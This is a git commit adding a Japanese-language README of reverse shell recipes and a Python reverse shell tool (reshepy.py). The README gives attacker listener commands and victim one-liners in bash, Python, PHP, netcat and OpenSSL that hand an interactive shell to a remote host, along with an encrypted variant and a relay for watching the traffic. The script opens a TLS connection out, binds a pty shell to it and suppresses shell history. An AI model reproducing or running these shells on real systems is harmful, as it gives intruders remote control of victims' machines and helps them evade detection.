216c0211f183dce3246ec2f0a460718a80719109
umaumax <umauma7083@gmail.com>
2019-11-17 09:47:57 +0900

    Add files

---
+++ README.md
@@ -0,0 +1,106 @@
+# reverse shell
+
+* [Reverse Shell \(リバースシェル\) 入門 & 実践 \- 好奇心の足跡]( https://kusuwada.hatenablog.com/entry/2019/10/30/044325 )
+
+## darwin
+* [macos \- Create reverse shell using High Sierra? \- Ask Different]( https://apple.stackexchange.com/questions/324824/create-reverse-shell-using-high-sierra )
+
+### attacker machine
+```
+nc -nvl 8080
+```
+
+### victim machine
+```
+mkfifo myfifo
+nc 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1
+rm -f myfifo
+```
+
+## ubuntu
+### attacker machine
+```
+nc -nvlp 8080
+```
+
+```
+socat tcp-listen:8080,reuseaddr,fork stdout
+```
+
+### victim machine
+```
+bash -i >& /dev/tcp/localhost/8080 0>&1
+```
+
+## common
+### attacker machine
+WIP
+
+### victim machine
+```
+python -c 'import sys,socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],int(sys.argv[2])));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' 127.0.0.1 8080
+```
+
+```
+php -r '$sock=fsockopen($argv[1],intval($argv[2]));exec("/bin/bash -i <&3 >&3 2>&3");' 127.0.0.1 8080
+```
+
+## FYI
+* [PayloadsAllTheThings/Reverse Shell Cheatsheet\.md at master · swisskyrepo/PayloadsAllTheThings]( https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md?source=post_page-----c7598145282d---------------------- )
+* `source`: [ersh\.py: a pure Python encrypted reverse shell \| Borderline]( https://blog.kwiatkowski.fr/?q=en/ersh )
+
+## secure
+
+[OpenSSLでReverse Shellの通信を暗号化する\(\+"Ctrl\+C"の対応\) \| 俺的備忘録 〜なんかいろいろ〜]( https://orebibou.com/2019/07/openssl%E3%81%A7reverse-shell%E3%81%AE%E9%80%9A%E4%BF%A1%E3%82%92%E6%9A%97%E5%8F%B7%E5%8C%96%E3%81%99%E3%82%8B%E3%82%AD%E3%83%BC%E3%83%90%E3%82%A4%E3%83%B3%E3%83%89%E5%AF%BE%E5%BF%9C/ )
+
+* 通信内容はsecureだが，通信相手が正しいとはわからない
+
+### attacker machine
+```
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 3650 -nodes
+# Country Name (2 letter code) []: US
+# Common Name (eg, fully qualified host name) []:www.localhost.com
+openssl s_server -quiet -key key.pem -cert cert.pem -port 8080
+```
+
+```
+reshepy localhost:8080
+```
+
+
+`socat` version
+```
+socat $(tty),raw,echo=0 openssl-listen:8080,reuseaddr,cert=cert.pem,key=key.pem,verify=0
+```
+
+at darwin
+`stty: stdin isn't a terminal`
+
+* [OpenSSL: How to create a certificate with an empty subject? \- Stack Overflow]( https://stackoverflow.com/questions/26058406/openssl-how-to-create-a-certificate-with-an-empty-subject )
+* [x509 \- OpenSSL: How to create a certificate with an empty subject DN? \- Super User]( https://superuser.com/questions/512673/openssl-how-to-create-a-certificate-with-an-empty-subject-dn )
+
+### victim machine
+```
+mkfifo /tmp/p;bash -i < /tmp/p 2>&1 | openssl s_client -quiet -connect 127.0.0.1:8080 > /tmp/p;rm -f /tmp/p
+```
+
+----
+
+## port forwarding
+下記のコマンドを`attacker`のlocalで動作させれば通信内容を見ることができる
+`localhost:8081`->`127.0.0.1:8080`
+```
+mkfifo fifo
+while true ; do nc -l 8081 < fifo | tee /dev/stderr | nc 127.0.0.1 8080 | tee /dev/stderr > fifo; done
+rm -f fifo
+```
+
+----
+
+## NOTE
+* `attacker`と`victim`のコマンドの組み合わせは基本的に自由
+* macでは`/dev/tcp/xxx`や`/dev/udp/xxx`などは利用できない
+* attackerで`nc`を利用して待ち受けている場合は`ctrl-c`で`nc`が終了してしまう
+  * `socat`を利用すればよいが，macには存在しない
+* 通常は非暗号化状態で通信
+* 接続直後に画面が乱れた場合には`stty sane`
---
+++ reshepy.py
@@ -0,0 +1,124 @@
+#!/usr/bin/env python3
+
+import os
+import sys
+import pty
+import select
+import socket
+import ssl
+import subprocess
+import argparse
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    parser.add_argument('-c', '--cert', default='',
+                        help='cert.pem (for oreore server certifications)')
+    # NOTE: this default value is used for avoiding 'ValueError: server_hostname cannot be an empty string or start with a leading dot.'
+    parser.add_argument('--host', default='',
+                        help='server (fully qualified) host name (e.g. www.localhost.com) (if None, address is used)')
+    parser.add_argument('-p', '--port', default=8080, type=int,
+                        help='server port')
+    parser.add_argument(
+        '--disable-ssl', action='store_true', help='disable ssl')
+    parser.add_argument('-k', '--insecure', action='store_true', help="""
+              (TLS) By default, every SSL connection this tool makes is verified to be
+              secure.  This  option allows curl to proceed and operate even for server
+              connections otherwise considered insecure.
+
+              The server connection is verified by making sure the server's certificate
+              contains  the  right name and verifies successfully using the cert store.
+            """)
+    parser.add_argument('-s', '--shell', default='/bin/bash',
+                        help='shell bin path')
+    parser.add_argument('address', default='localhost:8080',
+                        help='host[:port] server address')
+    # parser.add_argument('-v', '--verbose', action='store_true')
+
+    args, _ = parser.parse_known_args()
+    if len(_) > 0:
+        print("extra args {}".format(_), file=sys.stderr)
+        parser.print_help()
+        sys.exit(1)
+
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    if args.insecure:
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+    if args.cert:
+        context.load_verify_locations(args.cert)
+
+    port = args.port
+    splits = args.address.split(':')
+    if len(splits) == 1:
+        host = splits[0]
+    elif len(splits) == 2:
+        (host, port) = splits[0], int(splits[1])
+    else:
+        print("invalid address {}".format(args.address), file=sys.stderr)
+        sys.exit(1)
+
+    hostname = host
+    if args.host:
+        hostname = host
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
+        if args.disable_ssl:
+            sock.connect((host, port))
+            ret = reverse_shell_connect(sock, args.shell, ssl=False)
+        else:
+            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
+                ssock.connect((host, port))
+                ret = reverse_shell_connect(ssock, args.shell)
+    if not ret:
+        sys.exit(1)
+
+
+def reverse_shell_connect(sock, shell, ssl=True):
+    os.dup2(sock.fileno(), 0)
+    os.dup2(sock.fileno(), 1)
+    os.dup2(sock.fileno(), 2)
+    os.putenv("HISTFILE", '/dev/null')
+    if not ssl:
+        pty.spawn(shell)
+        sock.close()
+        return True
+
+    master, slave = pty.openpty()
+    # Run shell inside it
+    shell = subprocess.Popen([shell],
+                             preexec_fn=os.setsid,
+                             stdin=slave,
+                             stdout=slave,
+                             stderr=slave,
+                             universal_newlines=True)
+    try:
+        while shell.poll() is None:  # While shell is alive
+            # Wait for data on either the socket or the PTY
+            r, w, e = select.select([sock, master], [], [])
+
+            if sock in r:  # Reading data from the SSL socket
+                try:
+                    data = sock.recv(1024)
+                except ssl.SSLError as e:
+                    if e.errno == ssl.SSL_ERROR_WANT_READ:
+                        continue
+                    print("error {}".format(e), file=sys.stderr)
+                    raise
+                if not data:  # End of file.
+                    break
+                data_left = sock.pending()
+                while data_left:
+                    data += sock.recv(data_left)
+                    data_left = sock.pending()
+                os.write(master, data)
+            elif master in r:  # Reading data from the PTY.
+                sock.write(os.read(master, 2048))
+    finally:
+        sock.close()
+    return True
+
+
+if __name__ == "__main__":
+    main()
